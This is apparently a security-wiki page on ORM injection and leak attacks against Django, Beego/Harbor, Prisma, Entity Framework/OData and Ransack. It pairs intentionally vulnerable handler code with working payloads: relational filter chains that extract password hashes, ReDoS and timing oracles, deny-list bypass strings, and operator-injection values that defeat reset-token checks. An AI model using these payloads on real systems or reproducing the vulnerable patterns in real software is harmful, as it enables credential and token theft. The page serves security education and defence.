# ORM Injection

{{#include ../banners/hacktricks-training.md}}

## Django ORM (Python)

In [**this post**](https://www.elttam.com/blog/plormbing-your-django-orm/) is explained how it's possible to make a Django ORM vulnerable by using for example a code like:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
    """
        Some basic API view that users send requests to for
        searching for articles
    """
    def post(self, request: Request, format=None):
        try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
        except Exception as e:
            return Response([])
        return Response(serializer.data)
</code></pre>

Note how all the request.data (which will be a json) is directly passed to **filter objects from the database**. An attacker could send unexpected filters in order to leak more data than expected from it.

Examples:

- **Login:** In a simple login try to leak the passwords of the users registered inside of it.

```json
{
  "username": "admin",
  "password_startswith": "a"
}
```

> [!CAUTION]
> It's possible to brute-force the password until it's leaked.

- **Relational filtering**: It's possible to traverse relations in order to leak information from columns that weren't even expected to be used in the operation. For example, if it's possible to leak articles created by a user withe these relations: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).

```json
{
  "created_by__user__password__contains": "pass"
}
```

> [!CAUTION]
> It's possible to find the password of all the users that have created an article

- **Many-to-many relational filtering**: In the previous example we couldn't find passwords of users that haven't created an article. However, following other relationships this is possible. For example: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).

```json
{
  "created_by__departments__employees__user_startswith": "admi"
}
```

> [!CAUTION]
> In this case we can find all the users in the departments of users that have created articles and then leak their passwords (in the previous json we are just leaking the usernames but then it's possible to leak the passwords).

- **Abusing Django Group and Permission many-to-may relations with users**: Moreover, the AbstractUser model is used to generate users in Django and by default this model has some **many-to-many relationships with the Permission and Group tables**. Which basically is a default way to **access other users from one user** if they are in the **same group or share the same permission**.

```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```

- **Bypass filter restrictions**: The same blogpost proposed to bypass the use of some filtering like `articles = Article.objects.filter(is_secret=False, **request.data)`. t's possible to dump articles that have is_secret=True because we can loop back from a relationship to the Article table and leak secret articles from non secret articles because the results are joined and the is_secret field is checked in the non secret article while the data is leaked from the secret article.

```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```

> [!CAUTION]
> Abusing relationships it's possible to bypass even filters meant to protect the data shown.

- **Error/Time based via ReDoS**: In the previous examples it was expected to have different responses if the filtering worked or not to use that as oracle. But it could be possible that some action is done in the database and the response is always the same. In this scenario it could be possible to make the database error to get a new oracle.

```json
// Non matching password
{
    "created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```

From te same post regarding this vector:

- **SQLite**: Doesn't have a regexp operator by default (require loading a third-party extension)
- **PostgreSQL**: Doesn't have a default regex timeout and it's less prone to backtracking
- **MariaDB**: Doesn't have a regex timeout

## Beego ORM (Go) & Harbor Filter Oracles

Beego mirrors Django’s `field__operator` DSL, so any handler that lets users control the first argument to `QuerySeter.Filter()` exposes the entire graph of relations:

```go
qs := o.QueryTable("articles")
qs = qs.Filter(filterExpression, filterValue) // attacker controls key + operator
```

Requests such as `/search?filter=created_by__user__password__icontains=pbkdf` can pivot through foreign keys exactly like the Django primitives above. Harbor’s `q` helper parsed user input into Beego filters, so low-privileged users could probe secrets by watching list responses:

- `GET /api/v2.0/users?q=password=~$argon2id$` → reveals whether any hash contains `$argon2id$`.
- `GET /api/v2.0/users?q=salt=~abc` → leaks salt substrings.

Counting returned rows, observing pagination metadata, or comparing response lengths gives an oracle to brute-force entire hashes, salts, and TOTP seeds.

### Bypassing Harbor’s patches with `parseExprs`

Harbor attempted to protect sensitive fields by tagging them with `filter:"false"` and validating only the first segment of the expression:

```go
k := strings.SplitN(key, orm.ExprSep, 2)[0]
if _, ok := meta.Filterable(k); !ok { continue }
qs = qs.Filter(key, value)
```

Beego’s internal `parseExprs` walks every `__`-delimited segment and, when the current segment is **not** a relation, it simply overwrites the target field with the next segment. Payloads such as `email__password__startswith=foo` therefore pass Harbor’s `Filterable(email)=true` check but execute as `password__startswith=foo`, bypassing deny-lists.

v2.13.1 limited keys to a single separator, but Harbor’s own fuzzy-match builder appends operators after validation: `q=email__password=~abc` → `Filter("email__password__icontains", "abc")`. The ORM again interprets that as `password__icontains`. Beego apps that only inspect the first `__` component or that append operators later in the request pipeline stay vulnerable to the same overwrite primitive and can still be abused as blind leak oracles.

## Prisma ORM (NodeJS)

The following are [**tricks extracted from this post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

- **Full find contro**l:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
    try {
        // Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
    } catch (error) {
        res.json([]);
    }
});
</code></pre>

It's possible to see that the whole javascript body is passed to prisma to perform queries.

In the example from the original post, this would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone (username, password...)

```json
{
    "filter": {
        "include": {
            "createdBy": true
        }
    }
}

// Response
[
    {
        "id": 1,
        "title": "Buy Our Essential Oils",
        "body": "They are very healthy to drink",
        "published": true,
        "createdById": 1,
        "createdBy": {
            "email": "karen@example.com",
            "id": 1,
            "isAdmin": false,
            "name": "karen",
            "password": "super secret passphrase",
            "resetToken": "2eed5e80da4b7491"
        }
    },
    ...
]
```

The following one selects all the posts created by someone with a password and wil return the password:

```json
{
    "filter": {
        "select": {
            "createdBy": {
                "select": {
                    "password": true
                }
            }
        }
    }
}

// Response
[
    {
        "createdBy": {
            "password": "super secret passphrase"
        }
    },
    ...
]
```

- **Full where clause control**:

Let's take a look to this where the attack can control the `where` clause:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
    try {
        const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vulnerable to ORM Leaks
</strong>        })
        res.json(posts);
    } catch (error) {
        res.json([]);
    }
});
</code></pre>

It's possible to filter the password of users directly like:

```javascript
await prisma.article.findMany({
  where: {
    createdBy: {
      password: {
        startsWith: "pas",
      },
    },
  },
})
```

> [!CAUTION]
> Using operations like `startsWith` it's possible to leak information.

- **Many-to-many relational filtering bypassing filtering:**

```javascript
app.post("/articles", async (req, res) => {
  try {
    const query = req.body.query
    query.published = true
    const posts = await prisma.article.findMany({ where: query })
    res.json(posts)
  } catch (error) {
    res.json([])
  }
})
```

It's possible to leak not published articles by lopping back to the many-to-many relationships between `Category` -\[\*..\*]-> `Article`:

```json
{
  "query": {
    "categories": {
      "some": {
        "articles": {
          "some": {
            "published": false,
            "{articleFieldToLeak}": {
              "startsWith": "{testStartsWith}"
            }
          }
        }
      }
    }
  }
}
```

It's also possible to leak all the users abusing some loop back many-to-many relationships:

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "departments": {
                        "some": {
                          "employees": {
                            "some": {
                              "{fieldToLeak}": {
                                "startsWith": "{testStartsWith}"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

- **Error/Timed queries**: In the original post you can read an very extensive set of tests performed in order to find the optimal payload to leak information with a time based payload. This is:

```json
{
    "OR": [
        {
            "NOT": {ORM_LEAK}
        },
        {CONTAINS_LIST}
    ]
}
```

Where the `{CONTAINS_LIST}` is a list with 1000 strings to make sure the **response is delayed when the correct leak is found.**

### Type confusion on `where` filters (operator injection)

Prisma’s query API accepts either primitive values or operator objects. When handlers assume the request body contains plain strings but pass them directly to `where`, attackers can smuggle operators into authentication flows and bypass token checks.

```ts
const user = await prisma.user.findFirstOrThrow({
    where: { resetToken: req.body.resetToken as string }
})
```

Common coercion vectors:

- **JSON body** (default `express.json()`): `{"resetToken":{"not":"E"},"password":"newpass"}` ⇒ matches every user whose token is not `E`.
- **URL-encoded body** with `extended: true`: `resetToken[not]=E&password=newpass` becomes the same object.
- **Query string** in Express <5 or with extended parsers: `/reset?resetToken[contains]=argon2` leaks substring matches.
- **cookie-parser** JSON cookies: `Cookie: resetToken=j:{"startsWith":"0x"}` if cookies are forwarded to Prisma.

Because Prisma happily evaluates `{ resetToken: { not: ... } }`, `{ contains: ... }`, `{ startsWith: ... }`, etc., any equality check on secrets (reset tokens, API keys, magic links) can be widened into a predicate that succeeds without knowing the secret. Combine this with relational filters (`createdBy`) to pick a victim.

Look for flows where:

- Request schemas aren't enforced, so nested objects survive deserialization.
- Extended body/query parsers stay enabled and accept bracket syntax.
- Handlers forward user JSON directly into Prisma instead of mapping onto allow-listed fields/operators.

## Entity Framework & OData Filter Leaks

### Reflection-based text helpers leak secrets

<details>
<summary>Microsoft TextFilter helper abused for leaks</summary>

```csharp
IQueryable<T> TextFilter<T>(IQueryable<T> source, string term) {
    var stringProperties = typeof(T).GetProperties().Where(p => p.PropertyType == typeof(string));
    if (!stringProperties.Any()) { return source; }
    var containsMethod = typeof(string).GetMethod("Contains", new[] { typeof(string) });
    var prm = Expression.Parameter(typeof(T));
    var body = stringProperties
        .Select(prop => Expression.Call(Expression.Property(prm, prop), containsMethod!, Expression.Constant(term)))
        .Aggregate(Expression.OrElse);
    return source.Where(Expression.Lambda<Func<T, bool>>(body, prm));
}
```
</details>

Helpers that enumerate every string property and wrap them inside `.Contains(term)` effectively expose passwords, API tokens, salts, and TOTP secrets to any user who can call the endpoint. Directus **CVE-2025-64748** is a real-world example where the `directus_users` search endpoint included `token` and `tfa_secret` in its generated `LIKE` predicates, turning result counts into a leak oracle.

### OData comparison oracles

ASP.NET OData controllers often return `IQueryable<T>` and allow `$filter`, even when functions such as `contains` are disabled. As long as the EDM exposes the property, attackers can still compare on it:

```
GET /odata/Articles?$filter=CreatedBy/TfaSecret ge 'M'&$top=1
GET /odata/Articles?$filter=CreatedBy/TfaSecret lt 'M'&$top=1
```

The mere presence or absence of results (or pagination metadata) lets you binary-search each character according to the database collation. Navigation properties (`CreatedBy/Token`, `CreatedBy/User/Password`) enable relational pivots similar to Django/Beego, so any EDM that exposes sensitive fields or skips per-property deny-lists is an easy target.

Libraries and middleware that translate user strings into ORM operators (e.g., Entity Framework dynamic LINQ helpers, Prisma/Sequelize wrappers) should be treated as high-risk sinks unless they implement strict field/operator allow-lists.

## **Ransack (Ruby)**

These tricks where [**found in this post**](https://positive.security/blog/ransack-data-exfiltration)**.**

> [!TIP]
> **Note that Ransack 4.0.0.0 now enforce the use of explicit allow list for searchable attributes and associations.**

**Vulnerable example:**

```ruby
def index
  @q = Post.ransack(params[:q])
  @posts = @q.result(distinct: true)
end
```

Note how the query will be defined by the parameters sent by the attacker. It was possible to for example brute-force the reset token with:

```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```

By brute-forcing and potentially relationships it was possible to leak more data from a database.

## Collation-aware leak strategies

String comparisons inherit the database collation, so leak oracles must be designed around how the backend orders characters:

- Default MariaDB/MySQL/SQLite/MSSQL collations are often case-insensitive, so `LIKE`/`=` cannot distinguish `a` from `A`. Use case-sensitive operators (regex/GLOB/BINARY) when the secret’s casing matters.
- Prisma and Entity Framework mirror the database ordering. Collations such as MSSQL’s `SQL_Latin1_General_CP1_CI_AS` place punctuation before digits and letters, so binary-search probes must follow that ordering rather than raw ASCII byte order.
- SQLite’s `LIKE` is case-insensitive unless a custom collation is registered, so Django/Beego leaks may need `__regex` predicates to recover case-sensitive tokens.

Calibrating payloads to the real collation avoids wasted probes and significantly speeds up automated substring/binary-search attacks.

## References

- [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [https://www.elttam.com/blog/leaking-more-than-you-joined-for/](https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
- [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{{#include ../banners/hacktricks-training.md}}



